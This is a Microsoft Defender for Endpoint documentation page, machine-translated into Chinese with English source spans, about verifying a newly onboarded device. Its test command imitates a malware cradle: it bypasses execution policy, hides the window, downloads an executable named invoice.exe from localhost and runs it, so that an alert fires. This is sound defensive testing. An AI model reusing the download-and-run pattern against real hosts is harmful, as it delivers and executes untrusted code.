---
title: 在新载入的 Microsoft Defender ATP 设备上运行检测测试
description: 在新载入的设备上运行检测脚本，以验证它是否正确载入到 Microsoft Defender ATP 服务。
keywords: 检测测试， 检测， powershell， 脚本， 验证， 载入， 适用于终结点载入的 microsoft defender， 客户端， 服务器， 测试
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 10154a734bb4c3d8b26fffb8618484aeb11f907a
ms.sourcegitcommit: 956176ed7c8b8427fdc655abcd1709d86da9447e
ms.translationtype: MT
ms.contentlocale: zh-CN
ms.lasthandoff: 03/23/2021
ms.locfileid: "51055916"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a><span data-ttu-id="39de5-104">在新载入的 Microsoft Defender 终结点设备上运行检测测试</span><span class="sxs-lookup"><span data-stu-id="39de5-104">Run a detection test on a newly onboarded Microsoft Defender for Endpoint device</span></span> 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


<span data-ttu-id="39de5-105">**适用于：**</span><span class="sxs-lookup"><span data-stu-id="39de5-105">**Applies to:**</span></span>
- <span data-ttu-id="39de5-106">受支持的 Windows 10 版本</span><span class="sxs-lookup"><span data-stu-id="39de5-106">Supported Windows 10 versions</span></span>
- <span data-ttu-id="39de5-107">Windows Server 2012 R2</span><span class="sxs-lookup"><span data-stu-id="39de5-107">Windows Server 2012 R2</span></span>
- <span data-ttu-id="39de5-108">Windows Server 2016</span><span class="sxs-lookup"><span data-stu-id="39de5-108">Windows Server 2016</span></span>
- <span data-ttu-id="39de5-109">Windows Server 版本 1803</span><span class="sxs-lookup"><span data-stu-id="39de5-109">Windows Server, version 1803</span></span>
- <span data-ttu-id="39de5-110">Windows Server，2019</span><span class="sxs-lookup"><span data-stu-id="39de5-110">Windows Server, 2019</span></span>
- [<span data-ttu-id="39de5-111">Microsoft Defender for Endpoint</span><span class="sxs-lookup"><span data-stu-id="39de5-111">Microsoft Defender for Endpoint</span></span>](https://go.microsoft.com/fwlink/?linkid=2154037)
- [<span data-ttu-id="39de5-112">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="39de5-112">Microsoft 365 Defender</span></span>](https://go.microsoft.com/fwlink/?linkid=2118804)

> <span data-ttu-id="39de5-113">想要体验 Microsoft Defender for Endpoint？</span><span class="sxs-lookup"><span data-stu-id="39de5-113">Want to experience Microsoft Defender for Endpoint?</span></span> [<span data-ttu-id="39de5-114">注册免费试用版。</span><span class="sxs-lookup"><span data-stu-id="39de5-114">Sign up for a free trial.</span></span>](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

<span data-ttu-id="39de5-115">在新载入的设备上运行以下 PowerShell 脚本，验证它是否正确报告给 Defender for Endpoint 服务。</span><span class="sxs-lookup"><span data-stu-id="39de5-115">Run the following PowerShell script on a newly onboarded device to verify that it is properly reporting to the Defender for Endpoint service.</span></span>

1. <span data-ttu-id="39de5-116">创建文件夹："C：\test-MDATP-test"。</span><span class="sxs-lookup"><span data-stu-id="39de5-116">Create a folder:  'C:\test-MDATP-test'.</span></span>
2. <span data-ttu-id="39de5-117">在设备上打开提升的命令行提示符并运行脚本：</span><span class="sxs-lookup"><span data-stu-id="39de5-117">Open an elevated command-line prompt on the device and run the script:</span></span>

   1. <span data-ttu-id="39de5-118">转到“**开始**”并键入“**cmd**”。</span><span class="sxs-lookup"><span data-stu-id="39de5-118">Go to **Start** and type **cmd**.</span></span>

   1. <span data-ttu-id="39de5-119">右键单击命令 **提示符** ，然后选择 **以管理员角色运行**。</span><span class="sxs-lookup"><span data-stu-id="39de5-119">Right-click **Command Prompt** and select **Run as administrator**.</span></span>

      ![指向"以管理员模式运行"的"窗口开始"菜单](images/run-as-admin.png)

3. <span data-ttu-id="39de5-121">在提示符下，复制并运行以下命令：</span><span class="sxs-lookup"><span data-stu-id="39de5-121">At the prompt, copy and run the following command:</span></span>

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

<span data-ttu-id="39de5-122">命令提示符窗口将自动关闭。</span><span class="sxs-lookup"><span data-stu-id="39de5-122">The Command Prompt window will close automatically.</span></span> <span data-ttu-id="39de5-123">如果成功，检测测试将标记为已完成，并且大约 10 分钟后，已载入设备的门户中将显示新警报。</span><span class="sxs-lookup"><span data-stu-id="39de5-123">If successful, the detection test will be marked as completed and a new alert will appear in the portal for the onboarded device in approximately 10 minutes.</span></span>

## <a name="related-topics"></a><span data-ttu-id="39de5-124">相关主题</span><span class="sxs-lookup"><span data-stu-id="39de5-124">Related topics</span></span>
- [<span data-ttu-id="39de5-125">载入 Windows 10 设备</span><span class="sxs-lookup"><span data-stu-id="39de5-125">Onboard Windows 10 devices</span></span>](configure-endpoints.md)
- [<span data-ttu-id="39de5-126">载入服务器</span><span class="sxs-lookup"><span data-stu-id="39de5-126">Onboard servers</span></span>](configure-server-endpoints.md)
- [<span data-ttu-id="39de5-127">Microsoft Defender 终结点载入问题疑难解答</span><span class="sxs-lookup"><span data-stu-id="39de5-127">Troubleshoot Microsoft Defender for Endpoint onboarding issues</span></span>](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
